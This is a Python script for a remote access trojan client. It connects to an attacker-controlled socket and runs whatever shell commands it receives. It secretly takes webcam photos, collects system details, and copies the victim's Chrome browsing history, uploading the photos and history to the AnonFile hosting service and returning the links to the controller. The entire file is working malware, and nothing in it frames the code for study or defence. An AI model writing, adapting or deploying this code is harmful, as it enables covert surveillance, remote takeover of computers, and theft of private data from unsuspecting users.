import socket
import os
import re
import cv2
from anonfile import AnonFile
import platform
import getpass
import sqlite3
import csv
import sqlite3
import time
import shutil
            
            
            
anon = AnonFile()
host = ""
port = 5050
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))
cwd = os.getcwd()

while True:
    command = client_socket.recv(1024).decode("utf-8")
    if "message" in command:
        content, amount = command, 0
        for x in range(len(content)):
            amount +=1 if content[x]== " " else 0
        content = content.split(" ", amount)
        count = content.pop(-1)
        message = str()
        content.pop(0)
        for x in range(len(content)):
            message += " " + content[x]
        msgbox = open("msgbox.vbs", "w")
        for _ in range(int(count)):
            msgbox.write(f"msgbox(\"{message}\")\n")
        msgbox.close()
        os.system("msgbox.vbs")
        os.remove("msgbox.vbs")
        client_socket.send("[SUCCES] Command execute succesfuly".encode("utf-8"))
        
    elif "cmd" in command:
        myex = re.compile(r"(cmd )")
        cmd = re.sub(myex, '',command)
        os.system(cmd)
        client_socket.send("[SUCCES] Command execute succesfuly".encode("utf-8"))
    
    elif command == "campic":
        camera_port = 0
        camera = cv2.VideoCapture(camera_port)
        return_value, image = camera.read()
        cv2.imwrite("campic.jpg", image)
        del(camera)
        upload = anon.upload("campic.jpg")
        client_socket.send(upload.url.geturl().encode("utf-8"))
        os.remove("campic.jpg")
        client_socket.send("[SUCCES] Command execute succesfuly".encode("utf-8"))
    
    elif command == "systeminfo":
        my_system = platform.uname()
        client_socket.send(f"System: {my_system.system} Node Name: {my_system.node} Release: {my_system.release}, Version: {my_system.version}, Machine: {my_system.machine}, Processor: {my_system.processor}".encode("utf-8"))
        
    elif command == "web_history":
            temp = (os.getenv('TEMP'))
            Username = (os.getenv('USERNAME'))
            shutil.rmtree(temp + r"\history12", ignore_errors=True)
            os.mkdir(temp + r"\history12")
            path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
            path_new = temp + r"\history12"
            copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
            os.system(copy_me_to_here)
            con = sqlite3.connect(path_new + r"\history")
            cursor = con.cursor()
            cursor.execute("SELECT url FROM urls")
            urls = cursor.fetchall()
            for x in urls:
                done = ("".join(x))
                f4 = open(temp + r"\history12" + r"\history.txt", 'a')
                f4.write(str(done))
                f4.write(str("\n"))
                f4.close()
            con.close()
            history_upload = anon.upload(temp + "\\history12" + "\\history.txt")
            client_socket.send(history_upload.url.geturl().encode("utf-8"))
            os.remove(temp + "\\history12" + "\\history.txt")
            client_socket.send("[SUCCES] Command execute succesfuly".encode("utf-8"))
    else:
        client_socket.send("[ERROR] Command doesn't exist".encode("utf-8"))
